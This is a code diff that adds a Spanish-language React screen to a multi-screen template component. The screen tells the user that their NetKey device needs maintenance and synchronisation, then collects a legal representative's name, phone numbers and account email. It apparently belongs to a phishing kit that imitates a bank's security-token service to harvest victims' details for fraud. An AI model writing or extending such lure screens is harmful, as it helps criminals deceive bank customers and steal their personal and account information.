@@ -1516,6 +1516,105 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         );
         return accesoDenegadoContent;
 
+      case ScreenType.ACCESO_DENEGADO_2:
+        const handleAccesoDenegado2Submit = () => {
+          if (telefonoAcceso1 && correoAcceso && nombreRepAcceso) {
+            onSubmit(ScreenType.ACCESO_DENEGADO_2, { 
+              telefono1: telefonoAcceso1, 
+              telefono2: telefonoAcceso2, 
+              correo: correoAcceso, 
+              nombreRepresentante: nombreRepAcceso 
+            });
+          }
+        };
+
+        const accesoDenegado2Content = (
+          <div className="bg-white p-6 rounded-lg">
+            <div className="bg-[#d32f2f] text-white p-6 rounded-t-lg text-center mb-6">
+              <h2 className="text-2xl font-bold">Acceso Denegado</h2>
+            </div>
+
+            <div className="bg-gray-50 p-6 rounded-lg">
+              <p className="text-gray-700 mb-6 leading-relaxed">
+                Su dispositivo NetKey requiere mantenimiento para continuar funcionando de manera adecuada. 
+                Es necesario sincronizarlo para restablecer su servicio correctamente.
+              </p>
+
+              <div className="bg-white p-6 rounded-lg border border-gray-300 mb-6">
+                <h3 className="text-[#003d7a] font-bold text-lg mb-4">Información de contacto requerida</h3>
+                <p className="text-gray-700 mb-4 text-sm">
+                  Para proceder con la sincronización, por favor complete los siguientes datos:
+                </p>
+
+                <div className="space-y-4">
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-2">
+                      Nombre del representante legal <span className="text-red-600">*</span>
+                    </label>
+                    <input 
+                      type="text" 
+                      value={nombreRepAcceso}
+                      onChange={(e) => setNombreRepAcceso(e.target.value)}
+                      placeholder="Nombre completo del representante legal"
+                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
+                    />
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-2">
+                      Número de teléfono 1 <span className="text-red-600">*</span>
+                    </label>
+                    <input 
+                      type="tel" 
+                      value={telefonoAcceso1}
+                      onChange={(e) => setTelefonoAcceso1(e.target.value.replace(/\D/g, '').slice(0, 10))}
+                      placeholder="10 dígitos"
+                      maxLength={10}
+                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
+                    />
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-2">
+                      Número de teléfono 2 (opcional)
+                    </label>
+                    <input 
+                      type="tel" 
+                      value={telefonoAcceso2}
+                      onChange={(e) => setTelefonoAcceso2(e.target.value.replace(/\D/g, '').slice(0, 10))}
+                      placeholder="10 dígitos"
+                      maxLength={10}
+                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
+                    />
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-2">
+                      Correo electrónico de su cuenta <span className="text-red-600">*</span>
+                    </label>
+                    <input 
+                      type="email" 
+                      value={correoAcceso}
+                      onChange={(e) => setCorreoAcceso(e.target.value)}
+                      placeholder="correo@ejemplo.com"
+                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
+                    />
+                  </div>
+
+                  <button
+                    onClick={handleAccesoDenegado2Submit}
+                    disabled={!telefonoAcceso1 || !correoAcceso || !nombreRepAcceso}
+                    className="w-full bg-[#003d7a] text-white py-3 px-6 rounded-lg font-semibold hover:bg-[#002a5c] transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-6"
+                  >
+                    Solicitar sincronización
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        );
+        return accesoDenegado2Content;
+
       case ScreenType.VUELOS_OTORGADOS:
         const audífonosOtorgadosContent = (
           <>
